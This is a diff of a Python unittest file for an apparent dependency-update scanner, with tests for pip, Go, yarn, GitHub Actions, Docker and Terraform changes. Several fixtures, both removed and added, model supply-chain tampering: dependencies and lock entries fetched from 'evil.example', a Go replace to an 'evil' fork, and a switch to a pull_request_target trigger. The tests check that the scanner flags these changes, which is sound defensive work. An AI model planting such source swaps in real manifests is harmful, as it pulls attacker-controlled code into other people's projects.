+            with self.subTest(head=head_mod):
+                plan = _plan(base, {"go.mod": head_mod})
+                self.assertEqual(plan.gaps, (("go.mod", "unresolved"),))
 
-    def test_listed_cobra_sum_bump_is_conclusive(self) -> None:
-        def go_sum(version: str, digest: str) -> str:
-            return (
-                f"github.com/spf13/cobra {version} h1:{digest}\ngithub.com/spf13/cobra {version}/go.mod h1:{digest}\n"
-            )
 
-        report = _run_listed_scan(
-            {"go.sum": go_sum("v1.8.0", "a" * 43 + "=")},
-            {"go.sum": go_sum("v1.8.1", "b" * 43 + "=")},
-            [
-                {
-                    "packageName": "github.com/spf13/cobra",
-                    "fromVersion": "v1.8.0",
-                    "toVersion": "v1.8.1",
-                    "upstreamRepo": "spf13/cobra",
-                }
-            ],
+class PythonTest(unittest.TestCase):
+    def test_requirement_pins_are_primary_under_their_pep_503_names(self) -> None:
+        base = {"requirements/dev.txt": "Flask_SQLAlchemy==3.0.0\nrequests==2.31.0  # http\n"}
+        head = {"requirements/dev.txt": "Flask_SQLAlchemy==3.1.0\nrequests==2.31.0  # http\n"}
+        self.assertEqual(
+            _plan(base, head).primary,
+            (Change("pip", "requirements", "flask-sqlalchemy", "==3.0.0", "==3.1.0"),),
         )
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
-        self.assertEqual(report["package_name"], "github.com/spf13/cobra")
 
-    def test_listed_go_versions_match_without_a_leading_v(self) -> None:
-        def go_mod(version: str) -> str:
-            return f"module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/spf13/cobra {version}\n)\n"
+    def test_text_beside_a_pin_on_its_line_cannot_change_unseen(self) -> None:
+        base = {"pyproject.toml": '[project]\ndependencies = ["requests==2.31.0"]\n'}
+        for head in (
+            '[project]\ndependencies = ["requests==2.32.0", "evil @ https://evil.example/e.tar.gz"]\n',
+            '[project]\ndependencies = ["requests[socks]==2.32.0"]\n',
+        ):
+            with self.subTest(head=head):
+                plan = _plan(base, {"pyproject.toml": head})
+                self.assertEqual(plan.primary, ())
+                self.assertEqual(plan.gaps, (("pyproject.toml", "unresolved"),))
 
-        def go_sum(version: str, digest: str) -> str:
-            return (
-                f"github.com/spf13/cobra {version} h1:{digest}\ngithub.com/spf13/cobra {version}/go.mod h1:{digest}\n"
-            )
+    def test_a_hash_change_at_an_unchanged_pin_is_a_gap(self) -> None:
+        base = {"requirements.txt": "requests==2.31.0 --hash=sha256:aaa\n"}
+        head = {"requirements.txt": "requests==2.31.0 --hash=sha256:bbb\n"}
+        self.assertEqual(_plan(base, head).gaps, (("requirements.txt", "unresolved"),))
 
-        report = _run_listed_scan(
-            {"go.mod": go_mod("v1.8.0"), "go.sum": go_sum("v1.8.0", "a" * 43 + "=")},
-            {"go.mod": go_mod("v1.8.1"), "go.sum": go_sum("v1.8.1", "b" * 43 + "=")},
-            [
-                {
-                    "packageName": "github.com/spf13/cobra",
-                    "fromVersion": "1.8.0",
-                    "toVersion": "1.8.1",
-                    "upstreamRepo": "spf13/cobra",
-                }
-            ],
-        )
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
-        self.assertEqual(report["package_name"], "github.com/spf13/cobra")
+    def test_a_poetry_lock_beside_a_pin_is_disclosed(self) -> None:
+        base = {"pyproject.toml": '[tool.poetry.dependencies]\nrequests = "2.31.0"\n', "poetry.lock": "a\n"}
+        head = {"pyproject.toml": '[tool.poetry.dependencies]\nrequests = "2.32.0"\n', "poetry.lock": "b\n"}
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, (Change("pip", ".", "requests", "2.31.0", "2.32.0"),))
+        self.assertEqual(plan.unparsed_locks, ("poetry.lock",))
 
-    def test_listed_npm_range_bump_is_conclusive(self) -> None:
-        base_lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.20",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
-                    "integrity": "sha512-lodash-old",
-                }
-            },
+
+class LineGrammarTest(unittest.TestCase):
+    _WORKFLOW = "on: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@{}\n      - uses: ./local\n"
+
+    def test_action_refs_are_primary_and_repeated_bumps_are_one_change(self) -> None:
+        base = {
+            ".github/workflows/ci.yml": self._WORKFLOW.format("v4"),
+            ".github/workflows/release.yml": self._WORKFLOW.format("v4"),
         }
-        head_lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.21",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
-                    "integrity": "sha512-lodash-new",
-                }
-            },
+        head = {
+            ".github/workflows/ci.yml": self._WORKFLOW.format("v5"),
+            ".github/workflows/release.yml": self._WORKFLOW.format("v5"),
         }
-        report = _run_listed_scan(
-            {
-                "package.json": json.dumps({"dependencies": {"lodash": "^4.17.20"}}) + "\n",
-                "package-lock.json": json.dumps(base_lock) + "\n",
-            },
-            {
-                "package.json": json.dumps({"dependencies": {"lodash": "^4.17.21"}}) + "\n",
-                "package-lock.json": json.dumps(head_lock) + "\n",
-            },
-            [
-                {
-                    "packageName": "lodash",
-                    "fromVersion": "4.17.20",
-                    "toVersion": "4.17.21",
-                    "upstreamRepo": "lodash/lodash",
-                }
-            ],
+        self.assertEqual(
+            _plan(base, head).primary,
+            (Change("github-actions", ".github/workflows", "actions/checkout", "v4", "v5"),),
         )
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
 
-    def test_listed_npm_range_bump_without_a_lockfile_is_unresolved(self) -> None:
-        report = _run_listed_scan(
-            {"package.json": json.dumps({"dependencies": {"lodash": "^4.17.20"}}) + "\n"},
-            {"package.json": json.dumps({"dependencies": {"lodash": "^4.17.21"}}) + "\n"},
-            [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")],
-        )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("package.json", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-
-    def test_listed_npm_range_bump_is_unresolved_when_the_lock_keeps_the_old_version(self) -> None:
-        lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.20",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
-                    "integrity": "sha512-lodash-old",
-                }
-            },
+    def test_a_uses_line_that_changed_beside_its_ref_is_a_gap(self) -> None:
+        base = {".github/workflows/ci.yml": self._WORKFLOW.format("v4")}
+        head = {
+            ".github/workflows/ci.yml": self._WORKFLOW.format("v5").replace("- uses:", "- if: always()\n        uses:")
         }
-        report = _run_listed_scan(
-            {
-                "package.json": json.dumps({"dependencies": {"lodash": "^4.17.20"}}) + "\n",
-                "package-lock.json": json.dumps(lock) + "\n",
-            },
-            {"package.json": json.dumps({"dependencies": {"lodash": "^4.17.21"}}) + "\n"},
-            [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")],
+        self.assertEqual(_plan(base, head).gaps, ((".github/workflows/ci.yml", "unresolved"),))
+
+    def test_a_workflow_change_outside_uses_lines_is_a_gap(self) -> None:
+        base = {".github/workflows/ci.yml": self._WORKFLOW.format("v4")}
+        head = {".github/workflows/ci.yml": self._WORKFLOW.format("v5").replace("on: push", "on: pull_request_target")}
+        self.assertEqual(_plan(base, head).gaps, ((".github/workflows/ci.yml", "unresolved"),))
+
+    def test_composite_action_refs_are_read(self) -> None:
+        base = {"tools/setup/action.yml": "runs:\n  steps:\n    - uses: actions/setup-node@v4.0.1\n"}
+        head = {"tools/setup/action.yml": "runs:\n  steps:\n    - uses: actions/setup-node@v4.0.2\n"}
+        self.assertEqual(
+            _plan(base, head).primary,
+            (Change("github-actions", "tools/setup", "actions/setup-node", "v4.0.1", "v4.0.2"),),
         )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("package.json", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
 
-    def test_changed_range_prefix_is_unresolved(self) -> None:
-        report = _run_listed_scan(
-            {"package.json": json.dumps({"dependencies": {"lodash": "4.17.20"}}) + "\n"},
-            {"package.json": json.dumps({"dependencies": {"lodash": "^4.17.21"}}) + "\n"},
-            [
-                {
-                    "packageName": "lodash",
-                    "fromVersion": "4.17.20",
-                    "toVersion": "4.17.21",
-                    "upstreamRepo": "lodash/lodash",
-                }
-            ],
+    def test_dockerfile_from_and_terraform_providers_are_primary(self) -> None:
+        lock = (
+            'provider "registry.terraform.io/hashicorp/aws" {{\n  version = "{}"\n  hashes = [\n    "h1:x",\n  ]\n}}\n'
         )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("package.json", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-
-    def test_replace_block_keeps_the_module_file_unresolved(self) -> None:
-        def go_mod(version: str, target: str) -> str:
-            return (
-                "module example.com/app\n\ngo 1.22\n\n"
-                f"require github.com/spf13/cobra {version}\n\n"
-                "replace (\n"
-                f"\tgithub.com/spf13/cobra {version} => {target} {version}\n"
-                ")\n"
-            )
-
-        report = _run_listed_scan(
-            {"go.mod": go_mod("v1.8.0", "github.com/spf13/cobra")},
-            {"go.mod": go_mod("v1.8.1", "github.com/evil/cobra")},
-            [
-                {
-                    "packageName": "github.com/spf13/cobra",
-                    "fromVersion": "1.8.0",
-                    "toVersion": "1.8.1",
-                    "upstreamRepo": "spf13/cobra",
-                }
-            ],
-        )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("go.mod", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-
-    def test_extra_yarn_descriptor_and_nested_lock_entry_stay_unresolved(self) -> None:
-        def yarn(version: str, integrity: str, other: str) -> str:
-            return (
-                f'lodash@^4.17.20:\n  version "{version}"\n'
-                f'  resolved "https://registry.yarnpkg.com/lodash/-/lodash-{version}.tgz"\n'
-                f'  integrity "{integrity}"\n\n'
-                f'lodash@^3.10.1:\n  version "3.10.1"\n'
-                f'  resolved "https://registry.yarnpkg.com/lodash/-/lodash-3.10.1.tgz"\n'
-                f'  integrity "{other}"\n'
-            )
-
-        def lock(version: str, integrity: str, nested: str) -> str:
-            lodash = {
-                "version": version,
-                "resolved": f"https://registry.npmjs.org/lodash/-/lodash-{version}.tgz",
-                "integrity": integrity,
-                "dependencies": {"minimist": {"version": "1.2.8", "integrity": nested}},
-            }
-            return json.dumps({"lockfileVersion": 1, "dependencies": {"lodash": lodash}}) + "\n"
-
-        listed = [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")]
-        clean = _run_listed_scan(
-            {
-                "yarn.lock": yarn("4.17.20", "sha-old", "sha-other"),
-                "package-lock.json": lock("4.17.20", "sha-old", "sha-mini"),
-            },
-            {
-                "yarn.lock": yarn("4.17.21", "sha-new", "sha-other"),
-                "package-lock.json": lock("4.17.21", "sha-new", "sha-mini"),
-            },
-            listed,
-        )
-        self.assertIs(clean["scan_conclusive"], True)
-        self.assertEqual(clean["status"], "clean")
-        self.assertNotIn("dependencies", clean)
-        tainted = _run_listed_scan(
-            {
-                "yarn.lock": yarn("4.17.20", "sha-old", "sha-other"),
-                "package-lock.json": lock("4.17.20", "sha-old", "sha-mini"),
-            },
-            {
-                "yarn.lock": yarn("4.17.21", "sha-new", "sha-evil"),
-                "package-lock.json": lock("4.17.21", "sha-new", "sha-evil"),
-            },
-            listed,
-        )
-        names = {item["package_name"] for item in tainted["dependencies"]}
-        self.assertIn("yarn.lock", names)
-        self.assertIn("package-lock.json", names)
-        self.assertIs(tainted["scan_conclusive"], False)
-        self.assertNotEqual(tainted["status"], "clean")
-
-        def stanza(selector: str, version: str, resolved: str) -> str:
-            return f'lodash@{selector}:\n  version "{version}"\n  resolved "{resolved}"\n  integrity "sha"\n'
-
-        base_lock = "\n".join(
+        base = {
+            "Dockerfile": "FROM node:20.10 AS build\nRUN make\n",
+            "infra/.terraform.lock.hcl": lock.format("5.30.0"),
+        }
+        head = {
+            "Dockerfile": "FROM node:20.11 AS build\nRUN make\n",
+            "infra/.terraform.lock.hcl": lock.format("5.31.0"),
+        }
+        self.assertEqual(
+            _plan(base, head).primary,
             (
-                stanza("^4.17.20", "4.17.20", "https://registry.yarnpkg.com/lodash/-/lodash-4.17.20.tgz"),
-                stanza("^4.0.0", "4.17.20", "https://registry.yarnpkg.com/lodash/-/lodash-4.17.20.tgz"),
-            )
+                Change("docker", ".", "node", "20.10", "20.11"),
+                Change("terraform", "infra", "registry.terraform.io/hashicorp/aws", "5.30.0", "5.31.0"),
+            ),
         )
-        head_lock = "\n".join(
-            (
-                stanza("^4.17.20", "4.17.21", "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"),
-                stanza("^4.17.21", "4.17.21", "https://evil.example/lodash.tgz"),
-            )
-        )
-        swap = _run_listed_scan(
-            {"package.json": '{"dependencies":{"lodash":"^4.17.20"}}\n', "yarn.lock": base_lock},
-            {"package.json": '{"dependencies":{"lodash":"^4.17.21"}}\n', "yarn.lock": head_lock},
-            listed,
-        )
-        self.assertIs(swap["scan_conclusive"], False)
-        self.assertNotEqual(swap["status"], "clean")
 
-    def test_added_yarn_descriptor_at_the_listed_version_is_unresolved(self) -> None:
-        updates = [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")]
-        old = (
-            'lodash@^4.17.20:\n  version "4.17.20"\n'
-            '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.20.tgz"\n'
-            '  integrity "sha-old"\n'
+    def test_terraform_version_lines_are_primary_and_any_other_edit_is_a_gap(self) -> None:
+        module = 'module "vpc" {{\n  source  = "{}"\n  version = "{}"\n}}\n'
+        base = {"infra/main.tf": module.format("terraform-aws-modules/vpc/aws", "5.1.2")}
+        plan = _plan(base, {"infra/main.tf": module.format("terraform-aws-modules/vpc/aws", "5.2.0")})
+        self.assertEqual(
+            plan.primary, (Change("terraform", "infra", "terraform-aws-modules/vpc/aws", "5.1.2", "5.2.0"),)
         )
-        added = (
-            'lodash@^4.17.20:\n  version "4.17.21"\n'
-            '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"\n'
-            '  integrity "sha-new"\n\n'
-            'lodash@^4.17.21:\n  version "4.17.21"\n'
-            '  resolved "https://evil.example/lodash.tgz"\n'
-            '  integrity "sha-evil"\n'
-        )
-        self.assertFalse(manifest._entries_explain("yarn", old, added, updates))
-        report = _run_listed_scan({"yarn.lock": old}, {"yarn.lock": added}, updates)
-        self.assertIn("yarn.lock", {item["package_name"] for item in report["dependencies"]})
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
+        for head in (
+            module.format("git::https://evil.example/vpc", "5.2.0"),
+            module.format("terraform-aws-modules/vpc/aws", "5.2.0") + 'resource "null_resource" "x" {}\n',
+        ):
+            with self.subTest(head=head):
+                self.assertEqual(_plan(base, {"infra/main.tf": head}).gaps, (("infra/main.tf", "unresolved"),))
 
-    def test_duplicate_require_pin_and_warn_stay_non_clean(self) -> None:
-        updates = [_bump("github.com/spf13/cobra", "v1.8.0", "v1.8.1", "spf13/cobra")]
-        old_mod = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/spf13/cobra v1.8.0\n\tgithub.com/foo/bar v1.2.3\n)\n"
-        new_mod = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/spf13/cobra v1.8.1\n\tgithub.com/foo/bar v1.9.9\n\tgithub.com/foo/bar v1.2.3\n)\n"
-        report = _run_listed_scan(
-            {"go.mod": old_mod, "requirements.txt": "requests==2.31.0\n"},
-            {"go.mod": new_mod, "requirements.txt": "requests==9.9.9\nrequests==2.31.0\n"},
-            updates,
-        )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("go.mod", names)
-        self.assertIn("requirements.txt", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-        planted = _clean("left-pad", "left-pad/left-pad")
-        planted["status"] = "warn"
-        planted["findings"] = {key: [] for key in planted["findings"]}
-        planted["verdict_token_in_tree"] = True
-        grouped = coverage.aggregate([_clean("lodash", "lodash/lodash"), planted])
-        self.assertEqual(grouped["status"], "warn")
-        self.assertIs(grouped["verdict_token_in_tree"], True)
 
-    def test_package_named_go_mod_does_not_hide_an_extra_require(self) -> None:
-        base = "module example.com/app\n\ngo 1.22\n\nrequire github.com/foo/bar v1.2.3\n"
-        head = (
-            "module example.com/app\n\ngo 1.22\n\n"
-            "require github.com/foo/bar v1.9.9\n"
-            "require github.com/foo/bar v1.2.3\n"
-        )
-        report = _run_listed_scan(
-            {"go.mod": base},
-            {"go.mod": head},
-            [_bump("go.mod", "1.0.0", "1.0.1", "evil/mod")],
-        )
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-        unresolved = _unresolved(report)
-        self.assertIn("go.mod", unresolved)
-        self.assertIn("github.com/foo/bar", unresolved)
+class ChangedPathTest(unittest.TestCase):
+    def test_paths_that_are_not_dependency_files_are_gaps(self) -> None:
+        plan = _plan({"README.md": "a\n", "src/lib.go": "a\n"}, {"README.md": "b\n", "src/lib.go": "b\n"})
+        self.assertEqual(plan.gaps, (("README.md", "unresolved"), ("src/lib.go", "unresolved")))
 
-    def test_package_named_requirements_txt_does_not_hide_a_duplicate_pin(self) -> None:
-        report = _run_listed_scan(
-            {"requirements.txt": "requests==2.31.0\n"},
-            {"requirements.txt": "requests==9.9.9\nrequests==2.31.0\n"},
-            [_bump("requirements.txt", "1.0.0", "1.0.1", "evil/mod")],
-        )
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-        unresolved = _unresolved(report)
-        self.assertIn("requirements.txt", unresolved)
-        self.assertIn("requests", unresolved)
+    def test_manifests_with_no_grammar_are_unparsed_manifest_gaps(self) -> None:
+        paths = ("Cargo.toml", "Package.swift", "src/App.csproj", "packages.config")
+        plan = _plan({path: "a\n" for path in paths}, {path: "b\n" for path in paths})
+        self.assertEqual(set(plan.gaps), {(path, "unparsed_manifest") for path in paths})
 
-    def test_listed_cobra_bump_and_package_named_go_mod_stay_unresolved(self) -> None:
-        old_mod = (
-            "module example.com/app\n\ngo 1.22\n\nrequire (\n"
-            "\tgithub.com/spf13/cobra v1.8.0\n"
-            "\tgithub.com/foo/bar v1.2.3\n)\n"
+    def test_deleted_and_renamed_off_paths_are_gaps(self) -> None:
+        base = {"requirements.txt": "requests==2.31.0\n", "package-lock.json": _npm_lock({})}
+        head = {"NOTES.md": "requests==2.31.0\n"}
+        plan = _plan(base, head, renames={"NOTES.md": "requirements.txt"})
+        self.assertEqual(
+            set(plan.gaps),
+            {("package-lock.json", "unresolved"), ("requirements.txt", "unresolved"), ("NOTES.md", "unresolved")},
         )
-        new_mod = (
-            "module example.com/app\n\ngo 1.22\n\nrequire (\n"
-            "\tgithub.com/spf13/cobra v1.8.1\n"
-            "\tgithub.com/foo/bar v1.9.9\n"
-            "\tgithub.com/foo/bar v1.2.3\n)\n"
-        )
-        report = _run_listed_scan(
-            {"go.mod": old_mod},
-            {"go.mod": new_mod},
-            [
-                _bump("github.com/spf13/cobra", "v1.8.0", "v1.8.1", "spf13/cobra"),
-                _bump("go.mod", "1.0.0", "1.0.1", "evil/mod"),
-            ],
-        )
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-        unresolved = _unresolved(report)
-        self.assertIn("go.mod", unresolved)
-        self.assertIn("github.com/foo/bar", unresolved)
 
-    def test_unchanged_yarn_descriptors_are_not_named_on_an_unresolved_lock(self) -> None:
-        def lock(integrity: str) -> str:
-            return (
-                f'lodash@^4.17.20:\n  version "4.17.20"\n  integrity "{integrity}"\n\n'
-                'left-pad@^1.3.0:\n  version "1.3.0"\n  integrity "sha-a"\n\n'
-                'left-pad@^1.0.0:\n  version "1.3.0"\n  integrity "sha-a"\n'
-            )
+    def test_a_renamed_manifest_compares_its_old_text(self) -> None:
+        base = {"requirements.txt": "requests==2.31.0\n"}
+        head = {"requirements-base.txt": "requests==2.32.0\n"}
+        plan = _plan(base, head, renames={"requirements-base.txt": "requirements.txt"})
+        self.assertEqual(plan.primary, (Change("pip", ".", "requests", "==2.31.0", "==2.32.0"),))
 
-        report = _run_listed_scan(
-            {"yarn.lock": lock("sha-old")},
-            {"yarn.lock": lock("sha-new")},
-            [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")],
-        )
-        names = {item["package_name"] for item in report["dependencies"]}
-        self.assertIn("yarn.lock", names)
-        self.assertNotIn("left-pad", names)
-        self.assertIs(report["scan_conclusive"], False)
-        self.assertNotEqual(report["status"], "clean")
-
-    def test_go_sum_bump_that_keeps_old_lines_is_covered(self) -> None:
-        def go_sum(*versions: tuple[str, str]) -> str:
-            rows = []
-            for version, digest in versions:
-                rows.append(f"github.com/spf13/cobra {version} h1:{digest}")
-                rows.append(f"github.com/spf13/cobra {version}/go.mod h1:{digest}")
-            return "\n".join(rows) + "\n"
-
-        old_digest = "a" * 43 + "="
-        new_digest = "b" * 43 + "="
-        base = go_sum(("v1.8.0", old_digest))
-        head = go_sum(("v1.8.0", old_digest), ("v1.8.1", new_digest))
-        updates = [_bump("github.com/spf13/cobra", "v1.8.0", "v1.8.1", "spf13/cobra")]
-        report = _run_listed_scan({"go.sum": base}, {"go.sum": head}, updates)
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
-        self.assertEqual(report["package_name"], "github.com/spf13/cobra")
-        self.assertEqual(report["not_scanned_reason"], "")
-        rewritten = go_sum(("v1.8.0", "c" * 43 + "="), ("v1.8.1", new_digest))
-        self.assertFalse(manifest._entries_explain("go.sum", base, rewritten, updates))
-        extra = go_sum(("v1.8.0", old_digest), ("v1.8.1", new_digest), ("v1.9.0", "d" * 43 + "="))
-        self.assertFalse(manifest._entries_explain("go.sum", base, extra, updates))
-        both = go_sum(("v1.8.0", old_digest), ("v1.8.1", new_digest))
-        self.assertTrue(manifest._entries_explain("go.sum", both, go_sum(("v1.8.1", new_digest)), updates))
-
-    def test_mixed_case_requirement_name_is_covered(self) -> None:
-        self.assertEqual(python_manifest._requirement_name("PyYAML"), "pyyaml")
-        self.assertEqual(python_manifest._requirement_name("Foo_Bar.Baz"), "foo-bar-baz")
-        report = _run_listed_scan(
-            {"requirements.txt": "PyYAML==5.4.1\n"},
-            {"requirements.txt": "PyYAML==6.0.1\n"},
-            [_bump("PyYAML", "5.4.1", "6.0.1", "yaml/pyyaml")],
-        )
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
-        self.assertEqual(report["package_name"], "PyYAML")
-        self.assertEqual(report["not_scanned_reason"], "")
-        separators = _run_listed_scan(
-            {"requirements.txt": "Foo.Bar_Baz==1.0.0\n"},
-            {"requirements.txt": "Foo.Bar_Baz==1.1.0\n"},
-            [_bump("Foo_Bar.Baz", "1.0.0", "1.1.0", "example/foo-bar-baz")],
-        )
-        self.assertIs(separators["scan_conclusive"], True)
-        self.assertEqual(separators["status"], "clean")
-        self.assertEqual(separators["package_name"], "Foo_Bar.Baz")
-        self.assertEqual(separators["not_scanned_reason"], "")
+    def test_type_changes_are_gaps(self) -> None:
+        plan = diff.plan([("requirements.txt", "requirements.txt", "T")], lambda *_args: "", _BASE)
+        self.assertEqual(plan.gaps, (("requirements.txt", "unresolved"),))
 
 
 if __name__ == "__main__":
